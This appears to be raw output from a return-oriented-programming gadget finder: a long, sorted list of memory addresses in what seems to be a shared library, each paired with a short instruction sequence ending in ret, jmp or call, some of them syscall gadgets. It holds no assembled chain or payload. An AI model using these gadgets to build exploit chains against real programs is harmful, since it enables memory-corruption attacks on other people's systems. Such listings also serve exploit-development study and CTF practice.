0x00002aaaaabce7e9 : add ecx, dword ptr [rcx + 0xf30244c] ; xchg eax, esp ; ret 0x8445
0x00002aaaaab423cd : add ecx, dword ptr [rcx + rcx*4 + 0x42] ; or byte ptr [rbx - 0x76fefbbe], al ; ret 0xe281
0x00002aaaaabe76a4 : add ecx, dword ptr [rcx - 0x75] ; sbb byte ptr [r8 + 1], r9b ; ret 0x8948
0x00002aaaaab76f6b : add ecx, dword ptr [rcx - 0x76b7fcbe] ; clc ; ret
0x00002aaaaab8d6b9 : add ecx, dword ptr [rcx - 0x7d] ; ret
0x00002aaaaab8c378 : add ecx, dword ptr [rcx - 0x7d] ; ret 0x4201
0x00002aaaaab289a3 : add ecx, dword ptr [rcx - 0x7d] ; ret 0x4c05
0x00002aaaaabf8233 : add ecx, dword ptr [rcx - 0xc3fce3f] ; stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaac7c2b2 : add ecx, dword ptr [rdi + 0x380e4402] ; ret
0x00002aaaaac7b3b8 : add ecx, dword ptr [rdi + 0x80e6a02] ; ret
0x00002aaaaac8fa1d : add ecx, dword ptr [rdi + 0x80e7002] ; ret
0x00002aaaaab5be1d : add ecx, dword ptr [rdi] ; test byte ptr [rcx + rax], bh ; add byte ptr [rcx + rcx*4 - 0xa], cl ; call rax
0x00002aaaaab7aa10 : add ecx, dword ptr [rdi] ; test dword ptr [rcx + 8], ebp ; add byte ptr [rax], al ; ret
0x00002aaaaac783e2 : add ecx, dword ptr [rdx + 0xe] ; mov al, 1 ; add ah, byte ptr [rbx + 0x41180e0a] ; ret
0x00002aaaaac8277f : add ecx, dword ptr [rdx] ; ret
0x00002aaaaac796db : add ecx, dword ptr [rip + 0x380e0a03] ; ret
0x00002aaaaab7c020 : add ecx, dword ptr [rsi] ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab00e48 : add ecx, eax ; jmp rcx
0x00002aaaaabf8569 : add ecx, eax ; loopne 0x12357a ; cdqe ; shr rax, 4 ; ret
0x00002aaaaac253cb : add ecx, ebx ; jmp r9
0x00002aaaaab1cc96 : add ecx, ebx ; jmp rcx
0x00002aaaaabd6864 : add ecx, ebx ; ret
0x00002aaaaabd6578 : add ecx, ebx ; ret 0x3944
0x00002aaaaab0829c : add ecx, edi ; jmp rcx
0x00002aaaaab38e4a : add ecx, edx ; jmp rcx
0x00002aaaaab7f0e4 : add ecx, esi ; jmp rcx
0x00002aaaaac071dd : add edi, 0x10 ; jmp rcx
0x00002aaaaac0036f : add edi, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac0254a : add edi, 0x23b0 ; xor eax, eax ; jmp rcx
0x00002aaaaac02502 : add edi, 0x23b0 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaabd360d : add edi, 0x26 ; mov dword ptr fs:[rax], edi ; mov eax, 0xffffffff ; ret
0x00002aaaaaaf58ec : add edi, 0x47 ; shl rdi, 4 ; add rdi, rbp ; call rax
0x00002aaaaac09c84 : add edi, 0x58 ; jmp rcx
0x00002aaaaac093e4 : add edi, 0x68 ; jmp rcx
0x00002aaaaac06667 : add edi, 0xc8 ; jmp rcx
0x00002aaaaab72d64 : add edi, 1 ; mov rax, rdi ; ret
0x00002aaaaaba5a1b : add edi, 1 ; test dl, dl ; jne 0xd0a09 ; ret
0x00002aaaaab72d75 : add edi, 2 ; mov rax, rdi ; ret
0x00002aaaaab72d88 : add edi, 3 ; mov rax, rdi ; ret
0x00002aaaaab72d95 : add edi, 4 ; mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaab80b25 : add edi, 4 ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0xabb2b ; xor eax, eax ; ret
0x00002aaaaab72da8 : add edi, 5 ; mov dword ptr [rdi - 5], eax ; mov rax, rdi ; ret
0x00002aaaaab72d32 : add edi, 6 ; mov dword ptr [rdi - 6], eax ; mov rax, rdi ; ret
0x00002aaaaac02f61 : add edi, dword ptr [rax + 1] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac46f7f : add edi, dword ptr [rbp + 0x10] ; call r12
0x00002aaaaac794a3 : add edi, dword ptr [rdi + 0x380e0a01] ; ret
0x00002aaaaaaf58f4 : add edi, ebp ; call rax
0x00002aaaaac5b1c4 : add edi, ebp ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1c8 : add edi, ebp ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1cc : add edi, ebp ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac7b7d1 : add edi, ebp ; jmp rsi
0x00002aaaaac69221 : add edi, ebx ; call qword ptr [rax]
0x00002aaaaabb5e9d : add edi, ebx ; jmp rdi
0x00002aaaaac253c8 : add edi, edx ; add r9, r11 ; jmp r9
0x00002aaaaac6f3e1 : add edi, edx ; call rsp
0x00002aaaaabf8385 : add edi, edx ; mov qword ptr [r9], rdi ; ret
0x00002aaaaab41aa2 : add edi, esi ; jmp rdi
0x00002aaaaac69879 : add edi, esp ; call qword ptr [rax]
0x00002aaaaac69859 : add edi, esp ; inc dword ptr [rax + 5] ; cld ; jmp qword ptr [rax]
0x00002aaaaac698fd : add edi, esp ; jmp rax
0x00002aaaaabf957e : add edx, 1 ; syscall ; add rsp, 0x48 ; pop rbx ; pop rbp ; ret
0x00002aaaaabf8311 : add edx, 2 ; mov dword ptr [r8], edx ; mov qword ptr [r9], r10 ; ret
0x00002aaaaab80a56 : add edx, 4 ; mov ecx, dword ptr [rdx] ; test ecx, ecx ; jne 0xaba5a ; ret
0x00002aaaaab7f260 : add edx, 4 ; test ecx, ecx ; mov dword ptr [rdx], ecx ; jne 0xaa262 ; ret
0x00002aaaaac7e24a : add edx, dword ptr [rbx + 0xe] ; mov al, 1 ; add bl, byte ptr [rax + 0x41180e0a] ; ret
0x00002aaaaac440c9 : add edx, dword ptr [rdx + rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaab18417 : add edx, dword ptr [rip - 0x3e7cb700] ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaac7e202 : add edx, dword ptr [rsi + 0xe] ; mov al, 1 ; add bl, byte ptr [rax + 0x41180e0a] ; ret
0x00002aaaaabd2163 : add edx, dword ptr [rsp + 0x38] ; mov eax, edx ; add rsp, 0x48 ; ret
0x00002aaaaab73568 : add edx, eax ; jl 0x9e5d7 ; add rax, rdi ; ret
0x00002aaaaab73578 : add edx, eax ; jl 0x9e5d9 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab73598 : add edx, eax ; jl 0x9e5d9 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab735b8 : add edx, eax ; jl 0x9e5d9 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab72d1c : add edx, eax ; jmp r10
0x00002aaaaaaf60b8 : add edx, eax ; jmp rdx
0x00002aaaaab1e0b2 : add edx, eax ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaabb56b7 : add edx, ecx ; jmp rdx
0x00002aaaaabca9d4 : add edx, edi ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac5c429 : add edx, esi ; call qword ptr [rax]
0x00002aaaaac5c409 : add edx, esi ; call rax
0x00002aaaaac5c405 : add edx, esi ; jmp qword ptr [rax - 0x2f000dff]
0x00002aaaaac5c421 : add edx, esi ; jmp rax
0x00002aaaaab996b5 : add edx, esi ; jmp rdx
0x00002aaaaab8fcd5 : add edx, esi ; mov rax, rdx ; add rsp, 0x18 ; ret
0x00002aaaaac5c401 : add edx, esi ; push qword ptr [rax + 1] ; jmp qword ptr [rax - 0x2f000dff]
0x00002aaaaac5c419 : add edx, esi ; push qword ptr [rax - 0x2f000dff] ; add edx, esi ; jmp rax
0x00002aaaaac5c425 : add edx, esi ; push rax ; add edx, esi ; call qword ptr [rax]
0x00002aaaaac08435 : add esi, 0x38 ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab1d219 : add esi, 1 ; cmp rsi, rdx ; jne 0x4821a ; xor eax, eax ; ret
0x00002aaaaab7e099 : add esi, dword ptr [rax] ; in eax, dx ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaac771c2 : add esi, dword ptr [rbx + 0x47380e01] ; ret
0x00002aaaaac0b4e4 : add esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; cmp byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac0b996 : add esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac84392 : add esi, dword ptr [rsi + 0x44380e04] ; ret
0x00002aaaaac021b2 : add esi, dword ptr [rsi + 0xb] ; mov eax, 2 ; ret
0x00002aaaaaaff697 : add esi, dword ptr [rsi + rax + 0x5b] ; ret
0x00002aaaaab7323a : add esi, eax ; add dword ptr [rax], eax ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732b9 : add esi, eax ; add dword ptr [rax], eax ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab1b06b : add esi, eax ; jmp qword ptr [rax]
0x00002aaaaab038f2 : add esi, eax ; jmp rsi
0x00002aaaaac101f3 : add esi, eax ; mov qword ptr [rdi + 0x18], rsi ; ret
0x00002aaaaac90885 : add esi, ebp ; add al, byte ptr [rax] ; ret
0x00002aaaaac83919 : add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac79cc1 : add esi, ebp ; call qword ptr [rsi]
0x00002aaaaac2fc93 : add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac173f3 : add esi, ebx ; movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaabcb00c : add esi, ebx ; ret
0x00002aaaaab0af99 : add esi, ebx ; stosq qword ptr [rdi], rax ; ret
0x00002aaaaac44c9c : add esi, edi ; fadd st(3) ; ret
0x00002aaaaab7f129 : add esi, edi ; int1 ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab08413 : add esi, edi ; jmp rsi
0x00002aaaaac253c5 : add esi, edx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x00002aaaaac7ebb9 : add esi, edx ; call rdi
0x00002aaaaac5c46d : add esi, edx ; inc dword ptr [rax] ; add al, 0xf2 ; jmp qword ptr [rax]
0x00002aaaaac5c465 : add esi, edx ; inc eax ; add esi, edx ; jmp rax
0x00002aaaaac5c451 : add esi, edx ; jmp qword ptr [rax]
0x00002aaaaac5c469 : add esi, edx ; jmp rax
0x00002aaaaabab6db : add esi, esi ; ret
0x00002aaaaab43948 : add esi, esi ; ret 0x7420
0x00002aaaaac02f88 : add esp, 0x10 ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaab5c954 : add esp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac107f6 : add esp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab41476 : add esp, 0x10 ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44a14 : add esp, 0x10 ; mov rax, rsi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5a4a9 : add esp, 0x10 ; mov rsi, r12 ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaabe9734 : add esp, 0x10 ; pop rbx ; and eax, 0xc ; pop rbp ; pop r12 ; ret
0x00002aaaaab448c7 : add esp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaab90d63 : add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab0fdae : add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a83e : add esp, 0x10 ; pop rbx ; ret
0x00002aaaaab5aec7 : add esp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8e441 : add esp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac0ba7f : add esp, 0x100 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab62b8f : add esp, 0x100 ; ret
0x00002aaaaab5f78d : add esp, 0x100 ; sub rax, rdx ; ret
0x00002aaaaabe9b3e : add esp, 0x1000 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3fd23 : add esp, 0x1000 ; pop rbx ; ret
0x00002aaaaab3fd31 : add esp, 0x1000 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab3fbc9 : add esp, 0x1008 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0a9dd : add esp, 0x108 ; ret
0x00002aaaaabcc6be : add esp, 0x120 ; pop rbx ; ret
0x00002aaaaab0ad8b : add esp, 0x140 ; pop rbx ; ret
0x00002aaaaab0a3ab : add esp, 0x148 ; ret
0x00002aaaaab1a094 : add esp, 0x170 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9f2b7 : add esp, 0x18 ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaabf45c0 : add esp, 0x18 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaabd183d : add esp, 0x18 ; mov eax, edx ; ret
0x00002aaaaab40316 : add esp, 0x18 ; movzx eax, al ; neg eax ; ret
0x00002aaaaac0ef96 : add esp, 0x18 ; movzx eax, al ; pop rbx ; pop rbp ; ret
0x00002aaaaac1076c : add esp, 0x18 ; movzx eax, al ; ret
0x00002aaaaab7389b : add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac00f12 : add esp, 0x18 ; pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x00002aaaaab10175 : add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0fb50 : add esp, 0x18 ; ret
0x00002aaaaab4a115 : add esp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaba06b2 : add esp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabebd26 : add esp, 0x18 ; xor edx, edx ; div rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaabd195b : add esp, 0x190 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbcb7 : add esp, 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab1f803 : add esp, 0x20 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab42fe6 : add esp, 0x20 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab07fc6 : add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab441b4 : add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab46cc8 : add esp, 0x20 ; pop rbx ; ret
0x00002aaaaac07f79 : add esp, 0x20 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbc64 : add esp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0bde6 : add esp, 0x240 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf5b8e : add esp, 0x28 ; jmp rax
0x00002aaaaaaf56bd : add esp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab19c95 : add esp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab09ad3 : add esp, 0x28 ; ret
0x00002aaaaab5952e : add esp, 0x28 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab3fc51 : add esp, 0x28 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabffdc5 : add esp, 0x30 ; lea rax, qword ptr [rip + 0x29cf71] ; pop rbx ; ret
0x00002aaaaabffd8d : add esp, 0x30 ; lea rax, qword ptr [rip + 0x29cfa9] ; pop rbx ; ret
0x00002aaaaabffcce : add esp, 0x30 ; lea rax, qword ptr [rip + 0x29d068] ; pop rbx ; ret
0x00002aaaaabd0b15 : add esp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab599ca : add esp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabf5e4a : add esp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabffc9b : add esp, 0x30 ; pop rbx ; ret
0x00002aaaaabf5e79 : add esp, 0x30 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba24e8 : add esp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9daf7 : add esp, 0x38 ; ret
0x00002aaaaac07dd1 : add esp, 0x40 ; pop rbx ; movzx eax, al ; pop rbp ; pop r12 ; ret
0x00002aaaaabf2d8c : add esp, 0x40 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab0ae0c : add esp, 0x40 ; pop rbx ; ret
0x00002aaaaabde818 : add esp, 0x40 ; ret
0x00002aaaaac07d05 : add esp, 0x40 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3f96c : add esp, 0x400 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd9578 : add esp, 0x408 ; ret
0x00002aaaaab1f67c : add esp, 0x440 ; pop rbx ; ret
0x00002aaaaabccd72 : add esp, 0x48 ; movzx eax, al ; ret
0x00002aaaaac03b17 : add esp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabf9584 : add esp, 0x48 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9e3d2 : add esp, 0x48 ; ret
0x00002aaaaab80f5c : add esp, 0x50 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac14beb : add esp, 0x510 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac14c2b : add esp, 0x510 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd0e4f : add esp, 0x60 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd0ea3 : add esp, 0x60 ; mov rbx, rax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab81152 : add esp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabcb557 : add esp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbb10 : add esp, 0x60 ; pop rbx ; ret
0x00002aaaaab815a6 : add esp, 0x60 ; pop rbx ; sub rax, rbp ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf4b0a : add esp, 0x600 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbce91 : add esp, 0x68 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac0cb7c : add esp, 0x68 ; ret
0x00002aaaaac07761 : add esp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac0b270 : add esp, 0x70 ; pop rbx ; ret
0x00002aaaaabda14d : add esp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f953 : add esp, 0x80 ; add rsp, 8 ; ret
0x00002aaaaab29e4e : add esp, 0x80 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4a9a0 : add esp, 0x80 ; mov eax, edx ; ret
0x00002aaaaab40a61 : add esp, 0x80 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab46031 : add esp, 0x80 ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab52f30 : add esp, 0x80 ; mov rax, r8 ; ret
0x00002aaaaab0faa8 : add esp, 0x80 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab44e09 : add esp, 0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1a383 : add esp, 0x80 ; pop rbx ; ret
0x00002aaaaab404b9 : add esp, 0x80 ; ret
0x00002aaaaab0eedf : add esp, 0x80 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0a96b : add esp, 0x88 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0a8d3 : add esp, 0x88 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0aa91 : add esp, 0x90 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0ab99 : add esp, 0x90 ; pop rbx ; ret
0x00002aaaaab0b951 : add esp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf59af : add esp, 0x98 ; ret
0x00002aaaaab9c511 : add esp, 0x98 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab0aebd : add esp, 0xa0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0af74 : add esp, 0xa8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0bcfd : add esp, 0xa8 ; ret
0x00002aaaaab90a56 : add esp, 0xd0 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4062d : add esp, 0xd0 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaabd9895 : add esp, 0xd0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c38e : add esp, 0xd0 ; pop rbx ; ret
0x00002aaaaab0a69a : add esp, 0xd0 ; ret
0x00002aaaaabeaff4 : add esp, 0xd8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaabd937e : add esp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1acf4 : add esp, 0xd8 ; ret
0x00002aaaaac07473 : add esp, 8 ; add eax, 2 ; ret
0x00002aaaaab25195 : add esp, 8 ; add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaabd5bed : add esp, 8 ; cmp rax, -0xfff ; jae 0x100c04 ; ret
0x00002aaaaabdbe33 : add esp, 8 ; cmp rax, -0xfff ; jae 0x106e4a ; ret
0x00002aaaaabdc133 : add esp, 8 ; cmp rax, -0xfff ; jae 0x10714a ; ret
0x00002aaaaabdc1c3 : add esp, 8 ; cmp rax, -0xfff ; jae 0x1071da ; ret
0x00002aaaaabdc283 : add esp, 8 ; cmp rax, -0xfff ; jae 0x10729a ; ret
0x00002aaaaabdc3cd : add esp, 8 ; cmp rax, -0xfff ; jae 0x1073e4 ; ret
0x00002aaaaabdc4dd : add esp, 8 ; cmp rax, -0xfff ; jae 0x1074f4 ; ret
0x00002aaaaabdc56d : add esp, 8 ; cmp rax, -0xfff ; jae 0x107584 ; ret
0x00002aaaaabdc753 : add esp, 8 ; cmp rax, -0xfff ; jae 0x10776a ; ret
0x00002aaaaabdc7ad : add esp, 8 ; cmp rax, -0xfff ; jae 0x1077c4 ; ret
0x00002aaaaabdc8cd : add esp, 8 ; cmp rax, -0xfff ; jae 0x1078e4 ; ret
0x00002aaaaabdc933 : add esp, 8 ; cmp rax, -0xfff ; jae 0x10794a ; ret
0x00002aaaaabdcf73 : add esp, 8 ; cmp rax, -0xfff ; jae 0x107f8a ; ret
0x00002aaaaabdcfd3 : add esp, 8 ; cmp rax, -0xfff ; jae 0x107fea ; ret
0x00002aaaaaba070d : add esp, 8 ; cmp rax, -0xfff ; jae 0xcb724 ; ret
0x00002aaaaaba076d : add esp, 8 ; cmp rax, -0xfff ; jae 0xcb784 ; ret
0x00002aaaaabc9ec3 : add esp, 8 ; cmp rax, -0xfff ; jae 0xf4eda ; ret
0x00002aaaaabc9f23 : add esp, 8 ; cmp rax, -0xfff ; jae 0xf4f3a ; ret
0x00002aaaaabcb48d : add esp, 8 ; cmp rax, -0xfff ; jae 0xf64a4 ; ret
0x00002aaaaabcb6ad : add esp, 8 ; cmp rax, -0xfff ; jae 0xf66c4 ; ret
0x00002aaaaabcb70d : add esp, 8 ; cmp rax, -0xfff ; jae 0xf6724 ; ret
0x00002aaaaabcbd3d : add esp, 8 ; cmp rax, -0xfff ; jae 0xf6d54 ; ret
0x00002aaaaabcbe8d : add esp, 8 ; cmp rax, -0xfff ; jae 0xf6ea4 ; ret
0x00002aaaaabcfb6d : add esp, 8 ; cmp rax, -0xfff ; jae 0xfab84 ; ret
0x00002aaaaabd0653 : add esp, 8 ; cmp rax, -0xfff ; jae 0xfb66a ; ret
0x00002aaaaabd13bd : add esp, 8 ; cmp rax, -0xfff ; jae 0xfc3d4 ; ret
0x00002aaaaabd141d : add esp, 8 ; cmp rax, -0xfff ; jae 0xfc434 ; ret
0x00002aaaaabd19f3 : add esp, 8 ; cmp rax, -0xfff ; jae 0xfca0a ; ret
0x00002aaaaabd1bad : add esp, 8 ; cmp rax, -0xfff ; jae 0xfcbc4 ; ret
0x00002aaaaabd1c3d : add esp, 8 ; cmp rax, -0xfff ; jae 0xfcc54 ; ret
0x00002aaaaab61cad : add esp, 8 ; jmp rax
0x00002aaaaabf829d : add esp, 8 ; lea eax, dword ptr [rbp + rbx] ; pop rbx ; pop rbp ; ret
0x00002aaaaac00381 : add esp, 8 ; mov eax, 0x10 ; pop rbx ; pop rbp ; ret
0x00002aaaaab45449 : add esp, 8 ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaabe2e6d : add esp, 8 ; mov eax, 1 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda7ec : add esp, 8 ; mov eax, 5 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe73b9 : add esp, 8 ; mov eax, 7 ; pop rbx ; pop rbp ; ret
0x00002aaaaac16ac3 : add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab250df : add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab4543d : add esp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf6218 : add esp, 8 ; mov eax, edi ; neg eax ; ret
0x00002aaaaab29b87 : add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab1ac44 : add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab4077e : add esp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab731cd : add esp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x00002aaaaab076a7 : add esp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab52b28 : add esp, 8 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaab94284 : add esp, 8 ; mov rax, rdx ; ret
0x00002aaaaab0f1d0 : add esp, 8 ; mov rax, rsi ; pop rbx ; pop rbp ; ret
0x00002aaaaab59e0f : add esp, 8 ; mov rdi, rbp ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac01b59 : add esp, 8 ; mov rdi, rbp ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaac0ed1c : add esp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaab4cfc9 : add esp, 8 ; movzx eax, al ; neg eax ; ret
0x00002aaaaac039f7 : add esp, 8 ; movzx eax, al ; pop rbx ; pop rbp ; ret
0x00002aaaaab1a3b6 : add esp, 8 ; movzx eax, al ; ret
0x00002aaaaabfb9ea : add esp, 8 ; movzx eax, ax ; ret
0x00002aaaaac02c89 : add esp, 8 ; pop rbx ; pop rbp ; add eax, edx ; ret
0x00002aaaaab46fc0 : add esp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaab07dc1 : add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaaf6a31 : add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4e158 : add esp, 8 ; pop rbx ; pop rbp ; sub rax, rdx ; ret
0x00002aaaaab0a133 : add esp, 8 ; ret
0x00002aaaaac14a71 : add esp, 8 ; sar eax, 0x1f ; ret
0x00002aaaaac10864 : add esp, 8 ; shr eax, 0x1f ; ret
0x00002aaaaabe9e4e : add esp, 8 ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaaaf7b4c : add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4cd51 : add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabbed4b : add esp, 8 ; xor eax, eax ; ret
0x00002aaaaab52b69 : add esp, 8 ; xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaac872ac : add esp, dword ptr [rax + 0x200e0a01] ; ret
0x00002aaaaac697f5 : add esp, edi ; call rax
0x00002aaaaac69875 : add esp, edi ; push qword ptr [rax] ; add edi, esp ; call qword ptr [rax]
0x00002aaaaac69895 : add esp, edi ; push rax ; add bh, ah ; call rax
0x00002aaaaabf13f7 : add qword ptr [r11 + 0x460f09fb], r8 ; ret
0x00002aaaaac8277a : add qword ptr [r15], 3 ; popfq ; add ecx, dword ptr [rdx] ; ret
0x00002aaaaac84efd : add qword ptr [r8], r8 ; adc byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac84e3d : add qword ptr [r8], r8 ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
